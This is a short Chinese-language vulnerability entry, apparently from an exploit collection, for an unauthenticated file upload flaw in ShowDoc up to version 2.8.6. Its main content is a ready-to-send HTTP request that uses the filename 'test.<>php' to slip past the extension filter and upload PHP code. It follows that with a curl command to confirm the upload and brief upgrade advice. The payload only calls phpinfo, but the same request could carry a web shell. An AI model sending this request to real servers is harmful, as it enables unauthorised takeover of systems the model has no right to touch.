## 漏洞描述

ShowDoc 是一个开源的在线共享文档工具。ShowDoc <= 2.8.6 存在 uploadImg 文件上传漏洞，该漏洞源于未正确使用 upload 方法至文件后缀限制失效，攻击者可在未授权的情况下上传任意文件，进而获取服务器权限。

## 影响版本

- ShowDoc <= 2.8.6

## 前置条件

- 无需认证

## 利用步骤

1. 构造恶意文件上传请求
2. 利用文件后缀限制失效绕过

## Payload

```http
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: target:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0RdOKBR8AmAxfRyl

------WebKitFormBoundary0RdOKBR8AmAxfRyl
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?=phpinfo();?>
------WebKitFormBoundary0RdOKBR8AmAxfRyl--
```

## 验证方法

```bash
# 检查文件是否上传成功
curl -s http://target:8080/uploads/xxx/test.php | grep phpinfo
```

## 修复建议

1. 升级 ShowDoc 至 2.8.7+
2. 修复文件上传后缀限制逻辑
3. 对上传文件类型进行严格限制
